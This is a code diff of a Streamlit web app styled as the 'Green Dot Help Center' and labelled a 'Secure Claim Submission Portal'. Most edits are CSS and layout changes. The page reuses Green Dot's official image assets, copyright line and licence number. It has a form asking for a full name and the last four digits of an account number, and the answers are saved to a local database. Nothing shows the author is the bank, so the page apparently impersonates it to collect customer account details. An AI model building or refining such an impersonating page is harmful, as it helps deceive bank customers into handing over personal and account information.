@@ -23,11 +23,17 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- STYLING (Responsive + Theme Awareness) ---
+# --- STYLING ---
 st.markdown("""<style>
-/* Soporte para modo claro/oscuro usando variables de Streamlit */
-.main { 
-    padding: 1rem;
+/* Reducir espacio superior del contenedor principal */
+.block-container {
+    padding-top: 1rem !important;
+    padding-bottom: 0rem !important;
+}
+
+/* Forzar colores de texto para legibilidad en ambos modos */
+h1, h2, h3, p, label, .stMarkdown {
+    color: var(--text-color);
 }
 
 .stButton>button {
@@ -38,64 +44,41 @@ st.markdown("""<style>
     width: 100%;
 }
 
-/* Sección de descarga responsiva */
+/* Sección de descarga */
 .app-section-container {
     background-color: #000000;
-    color: #ffffff;
-    padding: 40px 20px;
+    color: #ffffff !important;
+    padding: 30px 20px;
     text-align: center;
-    margin-top: 30px;
-    width: 100%;
+    margin-top: 20px;
     border-radius: 15px;
 }
 
+.app-section-container * {
+    color: #ffffff !important;
+}
+
 .app-headline {
-    font-size: clamp(1.5rem, 5vw, 2.5rem);
+    font-size: clamp(1.5rem, 5vw, 2.2rem);
     font-weight: 800;
-    margin-bottom: 15px;
-}
-
-.app-subtext {
-    font-size: clamp(0.9rem, 2vw, 1.1rem);
-    margin-bottom: 25px;
-    max-width: 600px;
-    margin: 0 auto 25px auto;
-    opacity: 0.85;
-}
-
-.store-buttons {
-    display: flex;
-    justify-content: center;
-    gap: 15px;
-    flex-wrap: wrap;
-}
-
-.store-buttons img {
-    width: 140px;
-    height: auto;
+    margin-bottom: 10px;
 }
 
 .legal-footer {
     font-size: 0.75rem;
-    color: gray;
+    color: #666;
     text-align: justify;
     line-height: 1.5;
     padding: 20px 0;
-    margin-top: 40px;
+    margin-top: 20px;
     border-top: 1px solid #ddd;
-}
-
-/* Ajustes para móviles */
-@media (max-width: 600px) {
-    .app-headline { font-size: 1.8rem; }
-    .legal-footer { text-align: left; }
 }
 </style>""", unsafe_allow_html=True)
 
 # --- HEADER ---
 with st.container():
     if os.path.exists('logo.svg'):
-        st.image('logo.svg', width=180)
+        st.image('logo.svg', width=160)
     st.title("Green Dot Help Center")
     st.info("Secure Claim Submission Portal")
 
@@ -104,9 +87,9 @@ st.divider()
 # --- FORM ---
 with st.container():
     st.subheader("Submit a New Claim")
-    with st.form("claim_form_responsive", clear_on_submit=True):
+    with st.form("claim_form_final", clear_on_submit=True):
         nombre = st.text_input("Full Name")
-        col1, col2 = st.columns([1, 1])
+        col1, col2 = st.columns(2)
         with col1:
             cuenta = st.text_input("Account Number (Last 4)")
         with col2:
@@ -137,26 +120,21 @@ if submit:
     else:
         st.error("⚠️ Please complete all fields.")
 
-# --- APP DOWNLOAD SECTION (DARK MODE) ---
+# --- APP SECTION ---
 st.markdown("""
 <div class="app-section-container">
     <div class="app-headline">Download the Green Dot app</div>
-    <div class="app-subtext">
-        Manage your account from making deposits, to sending money or paying bills.
-    </div>
-    <div class="store-buttons">
-        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg"></a>
-        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg"></a>
+    <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
+        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg" width="140"></a>
+        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg" width="140"></a>
     </div>
 </div>
 """, unsafe_allow_html=True)
 
-# --- LEGAL FOOTER ---
+# --- FOOTER ---
 st.markdown("""
 <div class="legal-footer">
     * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account.<br><br>
-    Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank.<br><br>
     <strong>©2026 Green Dot Corporation. All rights reserved. NMLS #914924.</strong>
 </div>
 """, unsafe_allow_html=True)
